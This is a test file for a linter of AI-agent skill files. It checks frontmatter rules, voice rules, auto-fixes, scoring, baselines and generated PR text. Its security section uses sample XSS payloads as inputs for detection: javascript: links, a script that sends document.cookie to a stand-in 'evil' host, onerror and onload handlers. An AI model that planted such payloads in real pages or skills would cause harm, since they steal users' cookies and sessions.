import { describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  lint,
  applyFixes,
  buildPrBody,
  scoreDiagnostics,
  buildBaseline,
  applyBaseline,
  checkZombie,
  findOverlap,
} from "./skill-linter";

const cleanSkill = `---
name: example-skill
description: Use when the user asks to do X with Y. Triggers on phrases like "do x".
tags: [example, demo]
allowed-tools: Bash(echo:*)
---

# Example Skill

This is a demo skill body.

## Prerequisites

- \`echo\` — built-in
`;

describe("skill-linter rules", () => {
  test("clean skill emits no errors", () => {
    const { diagnostics } = lint(cleanSkill);
    expect(diagnostics.filter((d) => d.severity === "error")).toEqual([]);
  });

  test("R001: missing name is flagged + fixable from H1", () => {
    const md = `---\ndescription: x\n---\n# My Skill\n`;
    const diags = lint(md).diagnostics;
    const r001 = diags.find((d) => d.rule === "R001");
    expect(r001?.severity).toBe("error");
    expect(typeof r001?.fix).toBe("function");
    const fixed = r001!.fix!(md);
    expect(fixed).toMatch(/name:\s*my-skill/);
  });

  test("R002: missing description is flagged (not auto-fixable)", () => {
    const md = `---\nname: x\n---\n# X\n`;
    const r002 = lint(md).diagnostics.find((d) => d.rule === "R002");
    expect(r002?.severity).toBe("error");
    expect(r002?.fix).toBeUndefined();
  });

  test("R003: description >200 chars is flagged", () => {
    const long = "A".repeat(250);
    const md = `---\nname: x\ndescription: ${long}\n---\n`;
    const r003 = lint(md).diagnostics.find((d) => d.rule === "R003");
    expect(r003?.severity).toBe("warning");
  });

  test("R004: description without trigger phrase is flagged", () => {
    const md = `---\nname: x\ndescription: A library for parsing things.\n---\n`;
    const r004 = lint(md).diagnostics.find((d) => d.rule === "R004");
    expect(r004?.severity).toBe("warning");
  });

  test("R004: description WITH trigger phrase passes", () => {
    const md = `---\nname: x\ndescription: Use when the user asks for parsing.\n---\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R004")).toBeUndefined();
  });

  test("R004: frontmatter `triggers:` list also passes", () => {
    const md = `---\nname: x\ndescription: A parser.\ntriggers:\n  - "parse this"\n  - "tokenize"\n---\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R004")).toBeUndefined();
  });

  test("R004: empty triggers field still flags missing trigger", () => {
    const md = `---\nname: x\ndescription: A parser.\ntriggers:\n---\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R004")).toBeDefined();
  });

  test("R005: bare allowed-tools is flagged + fixed to Bash(name:*) form", () => {
    const md = `---\nname: x\ndescription: Use when X.\nallowed-tools: nmap, curl\n---\n# X\n`;
    const r005 = lint(md).diagnostics.find((d) => d.rule === "R005");
    expect(r005?.severity).toBe("error");
    const fixed = r005!.fix!(md);
    expect(fixed).toContain("Bash(nmap:*)");
    expect(fixed).toContain("Bash(curl:*)");
  });

  test("R006: skill declares CLIs but no Prerequisites — flagged + fixed", () => {
    const md = `---\nname: x\ndescription: Use when X.\nallowed-tools: Bash(nmap:*), Bash(sqlmap:*)\n---\n\n# X\n\nThis does things.\n`;
    const r006 = lint(md).diagnostics.find((d) => d.rule === "R006");
    expect(r006?.severity).toBe("warning");
    const fixed = r006!.fix!(md);
    expect(fixed).toMatch(/^## Prerequisites$/m);
    expect(fixed).toContain("**nmap**");
    expect(fixed).toContain("**sqlmap**");
  });

  test("R006: skill with existing Prerequisites is not flagged", () => {
    const md = `---\nname: x\ndescription: Use when X.\nallowed-tools: Bash(nmap:*)\n---\n\n# X\n\n## Prerequisites\n\n- nmap\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R006")).toBeUndefined();
  });

  test("R007: no tags/domain/category is info-level (not error)", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n`;
    const r007 = lint(md).diagnostics.find((d) => d.rule === "R007");
    expect(r007?.severity).toBe("info");
  });

  test("R008: broken anchor link is flagged", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nSee [details](#missing-section).\n`;
    const r008 = lint(md).diagnostics.find((d) => d.rule === "R008");
    expect(r008?.severity).toBe("warning");
    expect(r008?.message).toContain("missing-section");
  });

  test("R009: em dash in prose is flagged", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nThis is a thing — and another thing.\n`;
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009.length).toBeGreaterThan(0);
    expect(r009[0]!.severity).toBe("warning");
    expect(r009[0]!.message.toLowerCase()).toContain("em dash");
  });

  test("R009: em dash inside a code block is NOT flagged", () => {
    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n```\nfoo — bar\n```\n";
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009).toEqual([]);
  });

  test("R009: em dash inside inline code is NOT flagged", () => {
    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nThe `foo — bar` token is literal.\n";
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009).toEqual([]);
  });

  test("R009: banned AI vocabulary in prose is flagged", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nThis is a robust and comprehensive solution.\n`;
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009.length).toBeGreaterThan(0);
    expect(r009[0]!.message).toContain("robust");
    expect(r009[0]!.message).toContain("comprehensive");
  });

  test("R009: banned vocabulary inside code is NOT flagged", () => {
    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nThe variable `robust_check` is fine.\n";
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009).toEqual([]);
  });

  test("R009: banned phrase is flagged", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nLet's do a deep dive into this topic.\n`;
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009.some((d) => d.message.includes("deep dive"))).toBe(true);
  });

  test("R009: 'leverage' as verb is flagged", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nWe can leverage this library.\n`;
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009.some((d) => d.message.includes("leverage"))).toBe(true);
  });

  test("R009: 'leverage' as noun is NOT flagged", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nThe leverage ratio is 2:1.\n`;
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009).toEqual([]);
  });

  test("R009: frontmatter is exempt from voice rules", () => {
    const md = `---\nname: x\ndescription: A robust and comprehensive skill — use when X.\n---\n\n# X\n\nBody is fine.\n`;
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009).toEqual([]);
  });

  test("R009: clean skill passes", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nThis skill does the thing. It runs fast.\n`;
    const r009 = lint(md).diagnostics.filter((d) => d.rule === "R009");
    expect(r009).toEqual([]);
  });

  test("R009: has no auto-fix (voice needs human judgment)", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nThis is robust.\n`;
    const r009 = lint(md).diagnostics.find((d) => d.rule === "R009");
    expect(r009?.fix).toBeUndefined();
  });

  test("R010: bash block with 8+ command lines is flagged", () => {
    const block = Array.from({ length: 10 }, (_, i) => `cmd${i} --flag`).join("\n");
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nDo this:\n\n\`\`\`bash\n${block}\n\`\`\`\n`;
    const r010 = lint(md).diagnostics.find((d) => d.rule === "R010");
    expect(r010?.severity).toBe("info");
    expect(r010?.message).toMatch(/scripts\//);
    expect(r010?.fix).toBeUndefined();
  });

  test("R010: short bash block is NOT flagged", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n\`\`\`bash\nfoo\nbar\nbaz\n\`\`\`\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R010")).toBeUndefined();
  });

  test("R010: long JSON block is NOT flagged (not a shell language)", () => {
    const block = Array.from({ length: 12 }, (_, i) => `  "key${i}": ${i},`).join("\n");
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n\`\`\`json\n{\n${block}\n}\n\`\`\`\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R010")).toBeUndefined();
  });

  test("R010: untagged code block is NOT flagged", () => {
    const block = Array.from({ length: 10 }, (_, i) => `cmd${i} --flag`).join("\n");
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n\`\`\`\n${block}\n\`\`\`\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R010")).toBeUndefined();
  });

  test("R010: reports correct line number and counts additional blocks", () => {
    const block = Array.from({ length: 8 }, (_, i) => `cmd${i}`).join("\n");
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n\`\`\`bash\n${block}\n\`\`\`\n\nAnd:\n\n\`\`\`sh\n${block}\n\`\`\`\n`;
    const r010 = lint(md).diagnostics.find((d) => d.rule === "R010");
    expect(r010).toBeDefined();
    expect(r010?.message).toContain("+1 other block");
  });

  test("R011: skill with no example is flagged (info)", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nBody text only.\n`;
    const r011 = lint(md).diagnostics.find((d) => d.rule === "R011");
    expect(r011?.severity).toBe("info");
  });

  test("R011: <example> tag passes", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n<example>\nDo this.\n</example>\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R011")).toBeUndefined();
  });

  test("R011: ## Examples heading passes", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n## Examples\n\n- foo\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R011")).toBeUndefined();
  });

  test("R011: 'Example:' lead-in passes", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nExample: run \`foo\` then \`bar\`.\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R011")).toBeUndefined();
  });

  test("R013: stale description with no body overlap is flagged", () => {
    const md = `---\nname: x\ndescription: Use when extracting metadata from PDF documents using OCR pipelines.\n---\n\n# X\n\nThis skill compiles rust crates and runs cargo tests.\n`;
    const r013 = lint(md).diagnostics.find((d) => d.rule === "R013");
    expect(r013?.severity).toBe("info");
    expect(r013?.message).toMatch(/overlap is \d+%/);
  });

  test("R013: matching description and body passes", () => {
    const md = `---\nname: pdf-extract\ndescription: Use when extracting metadata from PDF documents using OCR pipelines.\n---\n\n# PDF Extract\n\nThis skill extracts PDF metadata via OCR pipelines. Documents go through the pipeline; extracted fields surface as JSON.\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R013")).toBeUndefined();
  });

  test("R013: short description (<5 content words) is exempt", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nUnrelated body text about other topics entirely.\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R013")).toBeUndefined();
  });
});

describe("ignore directives", () => {
  test("frontmatter `lint-ignore: R009` suppresses R009 file-wide", () => {
    const md = `---\nname: x\ndescription: Use when X.\nlint-ignore: R009\n---\n\n# X\n\nThis is robust and comprehensive.\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R009")).toBeUndefined();
  });

  test("frontmatter `lint-ignore: [R009, R011]` suppresses multiple rules", () => {
    const md = `---\nname: x\ndescription: Use when X.\nlint-ignore: [R009, R011]\n---\n\n# X\n\nThis is robust.\n`;
    const diags = lint(md).diagnostics.map((d) => d.rule);
    expect(diags).not.toContain("R009");
    expect(diags).not.toContain("R011");
  });

  test("frontmatter `lint-ignore: *` suppresses everything", () => {
    const md = `---\nname: x\ndescription: A library.\nlint-ignore: "*"\n---\n\n# X\n\nThis is robust.\n`;
    expect(lint(md).diagnostics).toEqual([]);
  });

  test("inline <!-- lint-ignore --> suppresses on next line", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n<!-- lint-ignore R009 -->\nThis is robust.\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R009")).toBeUndefined();
  });

  test("inline ignore does NOT suppress unrelated rules", () => {
    const md = `---\nname: x\ndescription: A library.\n---\n\n# X\n\n<!-- lint-ignore R009 -->\nThis is robust.\n`;
    // R004 still fires because description has no trigger phrase
    expect(lint(md).diagnostics.find((d) => d.rule === "R004")).toBeDefined();
  });
});

describe("em dash auto-fix (R009)", () => {
  test("em dash in prose is auto-fixed to comma+space", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nDo this — then that.\n`;
    const { fixed, applied } = applyFixes(md);
    expect(applied).toContain("R009");
    expect(fixed).toContain("Do this, then that.");
    expect(fixed).not.toContain("—");
  });

  test("em dash inside code block is NOT touched", () => {
    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n```\nfoo — bar\n```\n";
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("foo — bar");
  });

  test("em-dash fix is idempotent", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nA — B — C.\n`;
    const once = applyFixes(md).fixed;
    const twice = applyFixes(once).fixed;
    expect(twice).toBe(once);
  });

  // The fix masks code to spaces (length-preserving) to FIND em dashes, then
  // walked that same mask to collapse surrounding whitespace — so an inline
  // code span next to an em dash read as whitespace and got sliced away.
  // Measured on the real corpus: 723 spans destroyed across 178 skills.
  test("inline code before an em dash survives", () => {
    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n- `get_latest_news` — Fetch recent news\n";
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("`get_latest_news`");
    expect(fixed).toContain("- `get_latest_news`, Fetch recent news");
  });

  test("inline code after an em dash survives", () => {
    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nRun it — `bun test` proves it.\n";
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("`bun test`");
    expect(fixed).toContain("Run it, `bun test` proves it.");
  });

  test("code spans on both sides of an em dash both survive", () => {
    const md = "---\nname: x\ndescription: Use when X.\n---\n\n# X\n\n`a` — `b`\n";
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("`a`, `b`");
  });
});

describe("allowed-tools auto-fix (R005)", () => {
  const fm = (tools: string) =>
    `---\nname: x\ndescription: Use when X.\n${tools}\n---\n\n# X\n\nBody.\n`;

  test("a block sequence is rewritten whole, not orphaned under a scalar", () => {
    const md = fm("allowed-tools:\n  - ffmpeg\n  - imagemagick");
    const { fixed, applied } = applyFixes(md);
    expect(applied).toContain("R005");
    expect(fixed).toContain("allowed-tools: Bash(ffmpeg:*), Bash(imagemagick:*)");
    // The old fix replaced only the key line, leaving `  - ffmpeg` beneath a
    // scalar; YAML then folded the leftovers into one garbage string.
    expect(fixed).not.toMatch(/allowed-tools:.*\n\s+-\s/);
    expect(fixed).not.toContain("Bash(-:*)");
  });

  test("a pure-MCP block sequence is left alone", () => {
    const md = fm("allowed-tools:\n  - mcp__trendradar__get_latest_news\n  - mcp__trendradar__search_news");
    const { fixed, applied } = applyFixes(md);
    expect(applied).not.toContain("R005");
    expect(fixed).toBe(md);
  });

  test("top-level tools stay bare, bare CLI names get wrapped", () => {
    const md = fm("allowed-tools:\n  - Read\n  - Grep\n  - ffmpeg");
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("allowed-tools: Read, Grep, Bash(ffmpeg:*)");
  });

  test("bare `Bash` is a tool name, not a CLI name", () => {
    // Wrapping it produced the nonsense `Bash(Bash:*)`.
    const md = fm("allowed-tools: Bash");
    const { fixed, applied } = applyFixes(md);
    expect(applied).not.toContain("R005");
    expect(fixed).not.toContain("Bash(Bash:*)");
    expect(fixed).toBe(md);
  });

  test("a block of top-level tools including Bash is left alone", () => {
    const md = fm("allowed-tools:\n  - Read\n  - Write\n  - Edit\n  - Bash");
    const { fixed, applied } = applyFixes(md);
    expect(applied).not.toContain("R005");
    expect(fixed).toBe(md);
  });

  test("already-wrapped entries are preserved as written", () => {
    const md = fm("allowed-tools:\n  - Bash(git:*)\n  - ffmpeg");
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("allowed-tools: Bash(git:*), Bash(ffmpeg:*)");
  });

  test("inline comma-separated bare names still get wrapped", () => {
    const md = fm("allowed-tools: ffmpeg, imagemagick");
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("allowed-tools: Bash(ffmpeg:*), Bash(imagemagick:*)");
  });

  test("R005 fixes are idempotent", () => {
    const md = fm("allowed-tools:\n  - ffmpeg\n  - mcp__x__y\n  - Read");
    const once = applyFixes(md).fixed;
    const twice = applyFixes(once).fixed;
    expect(twice).toBe(once);
  });
});

describe("score", () => {
  test("clean diagnostics = 100", () => {
    expect(scoreDiagnostics([])).toBe(100);
  });

  test("single warning = 95", () => {
    expect(scoreDiagnostics([{ rule: "R009", severity: "warning", message: "x" }])).toBe(95);
  });

  test("single error = 80", () => {
    expect(scoreDiagnostics([{ rule: "R002", severity: "error", message: "x" }])).toBe(80);
  });

  test("score clamps to 0", () => {
    const diags = Array.from({ length: 10 }, () => ({ rule: "R002", severity: "error" as const, message: "x" }));
    expect(scoreDiagnostics(diags)).toBe(0);
  });

  test("lint() returns score on result", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n\n# X\n\nExample: foo.\n`;
    const result = lint(md);
    expect(typeof result.score).toBe("number");
    expect(result.score).toBeGreaterThanOrEqual(0);
    expect(result.score).toBeLessThanOrEqual(100);
  });
});

describe("baseline", () => {
  test("buildBaseline collects unique rule ids per file", () => {
    const b = buildBaseline([
      { path: "a/SKILL.md", diagnostics: [
        { rule: "R002", severity: "error", message: "x" },
        { rule: "R002", severity: "error", message: "x" },
        { rule: "R009", severity: "warning", message: "x" },
      ]},
      { path: "b/SKILL.md", diagnostics: [] },
    ]);
    expect(b.version).toBe(1);
    expect(b.files["a/SKILL.md"]).toEqual(["R002", "R009"]);
    expect(b.files["b/SKILL.md"]).toBeUndefined();
  });

  test("applyBaseline filters out rules listed in the baseline", () => {
    const baseline = buildBaseline([
      { path: "a/SKILL.md", diagnostics: [{ rule: "R009", severity: "warning", message: "x" }] },
    ]);
    const filtered = applyBaseline("a/SKILL.md", [
      { rule: "R009", severity: "warning", message: "x" },
      { rule: "R011", severity: "info", message: "y" },
    ], baseline);
    expect(filtered.map((d) => d.rule)).toEqual(["R011"]);
  });

  test("applyBaseline leaves un-baselined files untouched", () => {
    const baseline = buildBaseline([
      { path: "a/SKILL.md", diagnostics: [{ rule: "R009", severity: "warning", message: "x" }] },
    ]);
    const filtered = applyBaseline("b/SKILL.md", [
      { rule: "R009", severity: "warning", message: "x" },
    ], baseline);
    expect(filtered.length).toBe(1);
  });

  test("applyBaseline with null baseline is a no-op", () => {
    const diags = [{ rule: "R009", severity: "warning" as const, message: "x" }];
    expect(applyBaseline("a/SKILL.md", diags, null)).toEqual(diags);
  });
});

describe("R012 overlap", () => {
  const pdfA = `---\nname: pdf-extract-a\ndescription: Use when extracting PDF metadata via OCR pipelines.\ntags: [pdf, ocr, metadata, extract]\n---\n# A\n`;
  const pdfB = `---\nname: pdf-extract-b\ndescription: Use when extracting PDF metadata using OCR pipelines.\ntags: [pdf, ocr, metadata, extract]\n---\n# B\n`;
  const unrelated = `---\nname: rust-build\ndescription: Use when compiling rust crates and running cargo tests.\ntags: [rust, cargo, build]\n---\n# R\n`;

  test("findOverlap flags two near-duplicate skills", () => {
    const diags = findOverlap("a/SKILL.md", pdfA, [
      { path: "b/SKILL.md", content: pdfB },
      { path: "c/SKILL.md", content: unrelated },
    ]);
    expect(diags.length).toBe(1);
    expect(diags[0]!.rule).toBe("R012");
    expect(diags[0]!.message).toContain("b/SKILL.md");
    expect(diags[0]!.message).not.toContain("c/SKILL.md");
  });

  test("findOverlap suppresses self-match by path", () => {
    const diags = findOverlap("a/SKILL.md", pdfA, [{ path: "a/SKILL.md", content: pdfA }]);
    expect(diags).toEqual([]);
  });

  test("findOverlap skips skills with too few keywords", () => {
    const tiny = `---\nname: x\ndescription: Use when X.\n---\n`;
    const diags = findOverlap("a/SKILL.md", tiny, [{ path: "b/SKILL.md", content: pdfB }]);
    expect(diags).toEqual([]);
  });

  test("findOverlap returns empty corpus → no diagnostics", () => {
    expect(findOverlap("a/SKILL.md", pdfA, [])).toEqual([]);
  });
});

describe("R014 zombie skill", () => {
  function withTempAnalytics(events: object[], fn: (path: string) => void): void {
    const dir = mkdtempSync(join(tmpdir(), "cue-r014-"));
    const path = join(dir, "analytics.jsonl");
    writeFileSync(path, events.map((e) => JSON.stringify(e)).join("\n") + "\n");
    try { fn(path); } finally { rmSync(dir, { recursive: true, force: true }); }
  }

  test("flags a skill with 0 invocations in the window", () => {
    const md = `---\nname: my-skill\ndescription: Use when X.\n---\n# x\n`;
    withTempAnalytics([
      { ts: new Date().toISOString(), event: "skill_invoked", skill: "other-skill" },
    ], (path) => {
      const diags = checkZombie(md, { analyticsPath: path, windowDays: 30 });
      expect(diags.length).toBe(1);
      expect(diags[0]!.rule).toBe("R014");
      expect(diags[0]!.severity).toBe("info");
    });
  });

  test("passes a skill with at least one invocation", () => {
    const md = `---\nname: my-skill\ndescription: Use when X.\n---\n# x\n`;
    withTempAnalytics([
      { ts: new Date().toISOString(), event: "skill_invoked", skill: "my-skill" },
    ], (path) => {
      expect(checkZombie(md, { analyticsPath: path, windowDays: 30 })).toEqual([]);
    });
  });

  test("ignores invocations older than the window", () => {
    const md = `---\nname: stale-skill\ndescription: Use when X.\n---\n# x\n`;
    const oldTs = new Date(Date.now() - 60 * 24 * 3600 * 1000).toISOString();
    withTempAnalytics([
      { ts: oldTs, event: "skill_invoked", skill: "stale-skill" },
    ], (path) => {
      const diags = checkZombie(md, { analyticsPath: path, windowDays: 30 });
      expect(diags.length).toBe(1);
    });
  });

  test("silent no-op when analytics file is missing", () => {
    const md = `---\nname: x\ndescription: Use when X.\n---\n# x\n`;
    expect(checkZombie(md, { analyticsPath: "/tmp/definitely-not-a-real-path-12345.jsonl" })).toEqual([]);
  });

  test("silent no-op when frontmatter has no name", () => {
    const md = `---\ndescription: A library.\n---\n# X\n`;
    withTempAnalytics([], (path) => {
      expect(checkZombie(md, { analyticsPath: path })).toEqual([]);
    });
  });
});

describe("applyFixes round-trip", () => {
  test("fixing a broken skill makes errors disappear (round-trip)", () => {
    const broken = `---\nallowed-tools: nmap, sqlmap\n---\n# Pen Test Helper\n\nDoes stuff.\n`;
    const { fixed, applied } = applyFixes(broken);
    expect(applied).toContain("R001"); // name added
    expect(applied).toContain("R005"); // allowed-tools fixed
    expect(applied).toContain("R006"); // Prerequisites added
    // After fix, those three rules should no longer be flagged
    const remaining = lint(fixed).diagnostics.map((d) => d.rule);
    expect(remaining).not.toContain("R001");
    expect(remaining).not.toContain("R005");
    expect(remaining).not.toContain("R006");
  });

  test("applyFixes is idempotent — running twice is the same as once", () => {
    const broken = `---\nallowed-tools: nmap\n---\n# X\n`;
    const once = applyFixes(broken).fixed;
    const twice = applyFixes(once).fixed;
    expect(twice).toBe(once);
  });
});

describe("buildPrBody", () => {
  test("emits a title and body referencing the repo and listing fixes", () => {
    const before = `---\nallowed-tools: nmap\n---\n# X\n`;
    const { fixed, applied } = applyFixes(before);
    const fixedDiags = lint(before).diagnostics.filter((d) => applied.includes(d.rule));
    const left = lint(fixed).diagnostics;
    const { title, body } = buildPrBody({
      repo: "demo/skill",
      files: [{ path: "SKILL.md", before, after: fixed, fixedRules: [...new Set(applied)] }],
      diagnosticsFixed: fixedDiags, diagnosticsLeft: left,
    });
    expect(title).toContain("cue:");
    expect(body).toContain("demo/skill");
    expect(body).toContain("`cue`");
    expect(body).toContain("opt out");
    // Title now names the actual fixes (R001 → "add missing name:")
    expect(title).toMatch(/name|prerequisites|allowed-tools/i);
    // Body contains an inline diff
    expect(body).toContain("```diff");
  });
});

describe("buildPrTitle", () => {
  test("0 fixed rules → flagged review title", async () => {
    const { buildPrTitle } = await import("./skill-linter");
    expect(buildPrTitle([], ["R002"])).toMatch(/spec issues need review/);
  });
  test("1 rule → single-clause title", async () => {
    const { buildPrTitle } = await import("./skill-linter");
    expect(buildPrTitle(["R005"], [])).toMatch(/fix `allowed-tools` syntax/);
  });
  test("2 rules → joined with +", async () => {
    const { buildPrTitle } = await import("./skill-linter");
    expect(buildPrTitle(["R005", "R006"], [])).toMatch(/allowed-tools.*\+.*Prerequisites/);
  });
  test("3+ rules → truncates with `+N more`", async () => {
    const { buildPrTitle } = await import("./skill-linter");
    expect(buildPrTitle(["R001", "R005", "R006", "R007"], [])).toMatch(/\+\d+ more/);
  });
});

describe("R006 with cli-recipes", () => {
  test("Prerequisites section uses per-platform install commands from cli-recipes.json", () => {
    const md = `---\nname: x\ndescription: Use when X.\nallowed-tools: Bash(nmap:*)\n---\n\n# X\n\nBody.\n`;
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("sudo apt install -y nmap");
    expect(fixed).toContain("brew install nmap");
  });
  test("snap-only recipe (helm) emits snap command", () => {
    const md = `---\nname: x\ndescription: Use when X.\nallowed-tools: Bash(helm:*)\n---\n\n# X\n\nBody.\n`;
    const { fixed } = applyFixes(md);
    expect(fixed).toContain("sudo snap install helm");
  });
});

describe("R015 security", () => {
  const fm = `---\nname: x\ndescription: Use when the user asks to do X.\n---\n\n# X\n\n`;

  test("dangerous URL scheme in a prose link is flagged as error", () => {
    const md = fm + `See [click me](javascript:steal(document.cookie)) for details.\n`;
    const r = lint(md).diagnostics.find((d) => d.rule === "R015");
    expect(r?.severity).toBe("error");
  });

  test("the same dangerous link inside a code fence is NOT flagged (documentation)", () => {
    const md = fm + "Example of what NOT to do:\n\n```md\n[click me](javascript:steal())\n```\n";
    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
  });

  test("raw <script> in prose is flagged; inside a fence it is not", () => {
    const live = fm + `Inject <script>fetch("//evil?"+document.cookie)</script> here.\n`;
    expect(lint(live).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
    const doc = fm + "```html\n<script>example()</script>\n```\n";
    expect(lint(doc).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
  });

  test("invisible/bidi character anywhere is flagged AND auto-fixable", () => {
    const md = fm + "A line with a word\u2060joiner hidden in it.\n";
    const diag = lint(md).diagnostics.find((d) => d.rule === "R015");
    expect(diag?.severity).toBe("error");
    expect(diag?.fix).toBeDefined();
    const { fixed } = applyFixes(md);
    expect(/[\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff\u00ad]/.test(fixed)).toBe(false);
    expect(fixed).toContain("wordjoiner");
  });

  test("a clean skill produces no R015 diagnostics", () => {
    const md = fm + "Use https://example.com and a normal [link](https://example.com).\n";
    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
  });

  test("lint-ignore R015 suppresses the finding (escape hatch for security-doc skills)", () => {
    const md = `---\nname: x\ndescription: Use when X.\nlint-ignore: R015\n---\n\n# X\n\nRaw <iframe src=evil></iframe> shown deliberately.\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
  });

  test("prose with an on-prefixed word assigned a value does NOT false-positive", () => {
    for (const line of ["The job runs once = 'daily'.", "Set online = 'false' to disable.", "The only = 'admin' rule applies."]) {
      const md = fm + line + "\n";
      expect(lint(md).diagnostics.find((d) => d.rule === "R015")).toBeUndefined();
    }
  });

  test("unquoted inline event handler inside a tag IS flagged", () => {
    const md = fm + `An <img onerror=steal(document.cookie)> tag.\n`;
    expect(lint(md).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
  });

  test("raw <form> and a data:image/svg link are flagged", () => {
    const form = fm + `A <form action="javascript:bad()"> here.\n`;
    expect(lint(form).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
    const svg = fm + `An image ![x](data:image/svg+xml,<svg onload=alert(1)>) here.\n`;
    expect(lint(svg).diagnostics.find((d) => d.rule === "R015")?.severity).toBe("error");
  });
});
